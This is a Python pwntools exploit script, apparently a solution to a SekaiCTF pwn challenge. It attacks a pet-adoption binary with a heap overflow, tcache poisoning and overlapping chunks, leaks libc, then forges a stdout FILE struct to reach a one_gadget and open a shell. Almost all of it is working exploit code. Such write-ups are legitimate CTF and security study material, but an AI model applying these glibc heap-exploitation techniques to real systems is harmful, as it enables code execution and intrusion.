from pwn import *

EXE_FILENAME = "./learning_oop_patched"
exe = ELF(EXE_FILENAME)
context.binary = exe

libc = ELF("./libc.so.6")

DISPLACEMENT = 0x40
STDOUT_OFFSET = 0x2045c0
STDIN_OFFSET = 0x2038e0
WFILE_OVERFLOW_OFFSET = 0x202240
ONE_GADGET_OFFSET = 0xef52b

# p = gdb.debug([EXE_FILENAME], gdbscript='''
            #   b *($base_address + 0x00000000000020F0)
            #   b main
# ''')

p = process(EXE_FILENAME)

# p = remote("learning-oop-6ksb3y7ldtep.chals.sekai.team", 1337, ssl=True)

# User interactions
def adopt_new(username, pet_index=1, debug=False):
    p.sendline(b"1")
    if debug == True:
        print(p.recvuntil(b": "))
    else:
        p.recvuntil(b": ")
    p.sendline(str(pet_index).encode())
    if debug == True:
        print(p.recvuntil(b": "))
    else:
        p.recvuntil(b": ")
    p.sendline(username)
    if debug == True:
        print(p.recvuntil(b": "))
    else:
        p.recvuntil(b": ")
    leak = p.recvline()[:-1]
    leak = int(leak[2:], 16)
    if debug == True:
        print(p.recvuntil(b"> "))
    else:
        p.recvuntil(b"> ")
    return leak

def feed_pet(pet_index):
    p.sendline(b"3")
    p.recvuntil(b"?")
    p.sendline(str(pet_index).encode())
    p.recvuntil(b"> ")

def play_pet(pet_index):
    p.sendline(b"2")
    p.recvuntil(b"?")
    p.sendline(str(pet_index).encode())
    p.recvuntil(b"> ")

# This function should print a list full of address in hex
def print_addr_list(l, name="pets"):
    for i in range(len(l)):
        print(f"{name}[{i}]: {hex(l[i])}")

# This class initialize a Pet and allow to get a payload creating a pet with that properties
class Pet:
    def __init__(self, name = b"", age = 0x0, fullness = 0x0, status = 0x0, overflow = b""):
        self.name = name
        if len(name) < 0x100:
            self.name = self.name + b"\x00" * (0x100 - len(name))
        self.age = age
        self.fullness = fullness
        self.status = status
        self.overflow = overflow
    
    def get_payload(self, status = True):
        if status == False:
            payload = self.name + p32(self.age) + p32(self.fullness) + self.overflow
        else:    
            payload = self.name + p32(self.age) + p32(self.fullness) + p32(self.status) + self.overflow
        return payload
    
    def adopt(self, debug=False, pet_type = 1, status = True):
        return adopt_new(self.get_payload(status=status), pet_type, debug=debug)

    # Adopt several pet with all default properties but fullnesses given by a list
    def adopt_from_fullnesses(fullnesses):
        pets = []
        for fulness in fullnesses:
            tmp = Pet(fullness=fulness)
            pets.append(tmp.adopt())
        return pets     

p.recvuntil(b"> ")

# Set the tcache such that the pet at the head of the tcache is contiguos to the second one
tcache_pets = []
tcache_pets = Pet.adopt_from_fullnesses([3, 3, 1])
print_addr_list(tcache_pets, name="tcached")
play_pet(12)

# Overflow from the first pet into the second allows tcache poisoning
payload = p32(0x0) + p64(0x121) + p64((tcache_pets[2] + DISPLACEMENT) ^ (tcache_pets[2] >> 12) )
tmp = Pet(fullness=0x3, overflow=payload, status=0x0)
print(f"Overflowing from: {hex(tmp.adopt())}")

# Allocate two overlapping pet exploiting the tcache poisoning
spoofed_pets = []
pet_esterno = Pet(name=b"B" * 0x100 ,fullness=0xff)
spoofed_pets.append(pet_esterno.adopt())

# While allocating the inner pet be carefull to write correctly into the fields fullness and age
# of the outere pet to avoid it dying immediatly and to fix the size of the top chunk
payload = (p32(0x0) + p32(0x3)) * ((0x110 - DISPLACEMENT) // 8) + p64(0xd5e1)
payload = payload + b"B" * (0x100 - len(payload))
pet_interno = Pet(fullness=0x4, name=payload)
spoofed_pets.append(pet_interno.adopt(debug=True))

print_addr_list(spoofed_pets, name="spoofed")

# Reading the name of the outer pet vtable_leak the vtable of the inner one
p.sendline(b"2")
p.recvuntil(b"0. BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
vtable_leak = p.recvline()[:-1]
vtable_leak = int.from_bytes(vtable_leak, "little")
p.sendline(b"0")
p.recvuntil(b"> ")

print(f"Leak: {hex(vtable_leak)}")

# Reallocate the pet used to do the oveflow (it died meanwhile)
overflow_pet = Pet(fullness=0x4)
overflow_pet.adopt()

# The outer pet is now dead. I reallocate it and used it to fix the chunk metadata of the inner one
payload = b"D" * (DISPLACEMENT - 0x18) + (p64(0x0) + p64(0x121) + p64(vtable_leak))
pet_esterno = Pet(name = payload, fullness=0x2)
pet_esterno.adopt()

# Useless interaction to let the remaining pet die
play_pet(12)
play_pet(12)

# I repeat the same attack allocating two times the same chunk
payload = p32(0x0) + p64(0x121) + p64(spoofed_pets[0] ^ (spoofed_pets[0] >> 12))
overflow_pet = Pet(fullness=0xe, overflow=payload)
overflow_pet.adopt()


sovrapposti = Pet(fullness=0xff)
s = sovrapposti.adopt()
print(f"First overlapping allocation: {hex(s)}")

sovrapposti = Pet(fullness=12 * 2)
s = sovrapposti.adopt()
print(f"Second overlapping allocation: {hex(s)}")

# Filling the tcache
Pet.adopt_from_fullnesses([6, 5, 4, 3, 2, 1])

for i in range(5):
    play_pet(12)

# Now one of the two overlapping chunk died, this broke the other pet.
# Here I fix the vtable so the program doesn't crush on update
payload = p32(0x0) + p64(0x121) + p64(vtable_leak)[:-1]
overflow_pet = Pet(overflow=payload, fullness=0xff)
overflow_pet.adopt()

# It's possible to read the main arena from the remaining overlapping pet
p.sendline(b"2")
p.recvuntil(b"1. ")
libc_leak = p.recvline()[:-1]
libc_leak = int.from_bytes(libc_leak, "little")
libc_base = libc_leak - 0x203b20
print(f"Libc base: {hex(libc_base)}")
p.sendline(b"12")
p.recvuntil(b"> ")


Pet.adopt_from_fullnesses([0xff])

tmp = Pet(fullness=0xff)
addr = tmp.adopt()

# Preparing the one_gadget to call later
payload = p64(libc_base + ONE_GADGET_OFFSET)
buffer = Pet(fullness=0xff, name=payload)
buffer = buffer.adopt() + 0x8

print(f"Addr + 0x5a0: {hex(addr + 0x5a0)}\nbuffer: {hex(buffer - 0x8)}")

# Exploiting the same tcache poisoning attack we allocate on stdout
tcache_pets = []
payload = b"\x00" * (0xb8) + b"-i\0"
a = Pet(fullness=3, name=payload)
tcache_pets.append(a.adopt())

tmp_tcache_pets = Pet.adopt_from_fullnesses([3, 3])
tcache_pets = tcache_pets + tmp_tcache_pets
print_addr_list(tcache_pets, name="tcache_finale")
play_pet(12)
play_pet(12)


payload = p32(0x0) + p64(0x121) + p64( (libc_base + STDOUT_OFFSET - 0x110) ^ (tcache_pets[2] >> 12) )
out = Pet(overflow=payload, name=b"Bruh", fullness=0xff)
print(f"Adottato: {hex(out.adopt())}")

poisoned = Pet(fullness=0xff)
poisoned.adopt()

wide_data = libc_base + STDOUT_OFFSET - 0x50
wide_vtable = buffer - 0x68
# flags = b"\x00" * 0x10

# Building the poisoned FILE struct
payload = flat(
    b"\x00" * (0x88),
    libc_base + 0x205710,                       # lock
    wide_vtable,                                # _wide_data->vtable
    b"\x00" * (0xa0 - 0x98),
    wide_data,                                  # _widea_data struct
    b"\x00" * (0xd8 - 0xa8),
    libc_base + WFILE_OVERFLOW_OFFSET - 0x38    # FILE->vtable
)

# Overwrite stdout and trigger the payload
stream = Pet(fullness=0xff, overflow=payload)
p.sendline(b"1")
p.recvuntil(b":")
p.sendline(b"1")
p.recvuntil(b":")
p.sendline(stream.get_payload(status=False))

p.interactive()